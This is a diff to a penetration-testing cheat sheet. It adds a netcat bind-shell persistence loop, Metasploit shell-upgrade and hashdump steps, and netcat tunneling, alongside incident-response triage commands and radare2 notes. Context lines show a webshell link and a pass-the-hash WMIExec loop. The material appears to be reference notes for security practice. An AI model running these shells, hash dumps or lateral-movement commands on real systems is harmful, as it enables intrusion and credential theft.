@@ -35,6 +35,7 @@ toc-title: "Table of Contents"
 * [Online exiftool](http://exif.regex.info/exif.cgi)
 * Yandex, Google Images, Bing Images, Tiny Eye
 
+
 ## Nmap
 
 Quickstart:
@@ -476,6 +477,9 @@ webshell: [https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowse
 
 Basic lookup:
 
+Note: NSLookup is noisy, use another tool in case the lookup of those domain is
+sensitive.
+
 ```sh
 nslookup server <IP>
 ```
@@ -555,6 +559,23 @@ Sending files:
 sudo nc -nvlp 443 > incoming.exe     # Reciever
 nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
 ```
+
+Scan:
+
+```sh
+nc -v -w3 -z IP SPORT-EPORT
+```
+
+* `-w3`: no more than 3s per port
+* `-z`: minimal data sent
+
+Persistence:
+
+```sh
+while [ 1 ]; do echo "ping"; nc -lp PORT -e /bin/sh; done
+```
+
+Tip: use `nohup` to create persistence even if the user logs out.
 
 ## MSFVenom shells:
 
@@ -840,6 +861,20 @@ powershell "(New-Object System.Net.WebClient).DownloadFile("<IP+file>",
 
 
 # Post-Exploitation
+
+## Metasploit
+
+### Upgrade shell to meterpreter
+
+* Run the exploit directly in background: `exploit -z`
+* Use the post exploitation module: `use post/multi/manage/shell_to_meterpreter` (if you set the payload as simple reverse shell. Otherwise, it's meterpreter by default)
+* Set the session (find the sessions with `sessions -l`): `set SESSION N`
+* Connect to the session: `sessions -i N`
+
+### hashdump
+
+* In a meterpreter session run `run post/windows/gather/hashdump`
+
 
 ## Improve your shell
 
@@ -1277,6 +1312,17 @@ plink.exe -ssh -l <USER> -pw <PASSWORD> -R <BIND_IP>:<BIND_PORT>:127.0.0.1:<PORT
 
 ### Linux
 
+#### Netcat tunneling
+
+Listeners on attacker and victim machine.
+
+On the relay machine:
+
+```sh
+mknod backpipe p
+nc 127.0.0.1 444 0<backpipe | nc 127.0.0.1 2222 1>backpie
+```
+
 #### SSH tunneling
 
 ```sh
@@ -1285,9 +1331,9 @@ ssh -N -R <BIND_IP>:<BIND_PORT>:host:hostport <user@address>
 
 # dynamic port forward + add 8888 port to the proxychains conf
 ssh -N -D 127.0.0.1:8888 <user@address>
-
 ```
 ### SSH over HTTP (Squid)
+
 
 * socat
 ```
@@ -1295,12 +1341,14 @@ socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128
 
 ssh john@127.0.0.1 -p 9999
 ```
+
 * proxytunnel
 ```
 proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555
 
 ssh john@127.0.0.1 -p 5555
 ```
+
 * proxychains
 ```
 http 192.168.1.41 3128
@@ -1484,6 +1532,15 @@ dd if=/dev/rdisk0s1s2s bs=65536 conv=noerror,sync | ssh -C user@<IP> "cat >/tmp/
 This section cover detection malicious activity on system and could be a good
 list of stuff to clean up.
 
+Stages:
+
+* Preparation
+* Identification
+* Containment
+* Eradication
+* Recovery
+* Lesson Learned
+
 ## Linux
 
 List connected users:
@@ -1622,9 +1679,46 @@ less /tmp
 ls -la /tmp | grep xxx
 ```
 
+## Windows
+
+```cmd
+net view \\127.0.0.1 # shares
+net session # sessions
+net use # open sessions
+nbstat -s # netbios TCP/IP activity
+nbstat -na # unusual TCP/UDP port listening
+```
+
+Tasks:
+
+```cmd
+tasklist /v
+wmic process list full
+wmic process get name,parentprocessid,processid
+tasklist /m /fi "pid eq PID"
+wmic process where processid=PID get commandline
+```
+
+Services:
+
+```cmd
+services.msc
+net start
+sc query | more
+tasklist /svc
+```
+
+Check services listening to ports:
+
+```cmd
+netstat -nao | find "ESTABLISHED"
+tasklist /fi "pid eq PID"
+tasklist /fi "pid eq PID" /m # get list of modules
+```
+
 # Reverse
 
-## tricks
+## Tricks
 
 Print a decimal value in little endian:
 
@@ -1648,12 +1742,13 @@ Get-Item -Path file.exe -Stream *
 wmic process call create $(Resolve-Path file.exe:streamname)
 ```
 
-## radare2 suite
+## radare2/rizin suite
 
 ([Source](https://www.megabeets.net/a-journey-into-radare-2-part-1/) and [also](https://insinuator.net/2016/08/reverse-engineering-with-radare2-intro/))
 
 Get information about the binary:
 
+If you use rizin, use `rz-*`.
 ```sh
 rabin2 -I BIN # general info
 rabin2 -i BIN # imports
@@ -1672,8 +1767,7 @@ rasm2 # play with asm function
 * to list all imports: `ii`
 * `iz` lists strings in data sections and `izz` search for strings in the whole binary
 * `axt` stands for analyse x-refs to
-* use `s fcn.00501510` and `afn funcname` to rename functions or `afn name
-  fcn.00401510` You can use and address too.
+* use `s fcn.00501510` and `afn funcname` to rename functions or `afn name fcn.00401510` You can use and address too.
 * This command reveals us more of radare2 features. The `axt` command is used to "find data/code references to this address" (see ax?). The special operator @@ is like a foreach iterator sign, used to repeat a command over a list of offsets (see @@?), and `str.*` is a wildcard for all the flags that start with str.. This combination helps us not just to list the strings flags but also to list the function name, where they are used and the referencing instruction. Make sure to select the strings flagspace (default, use `fs *`) before.
 * to find a function or go somewhere, you can use `s` (seek). Ex: `s main` (your hex address will change and you will be in the main function)
 * to dissassemble: `pdf`. Whole sequence: `s main; pdf`
@@ -1785,6 +1879,8 @@ dcs* # emulate strace
 pd [len] @ eax # disass at register eax
 ```
 
+r2/rizin has a fork ability to split one proces in various thread (TODO)
+
 [SOURCE](https://radareorg.github.io/blog/posts/using-radare2/)
 
 Some stolen config from [https://gist.github.com/williballenthin/6857590dab3e2a6559d7](https://gist.github.com/williballenthin/6857590dab3e2a6559d7).
@@ -1894,7 +1990,6 @@ $hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHO
 
 foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }
 ```
-
 
 
 ## (n)Vim tricks
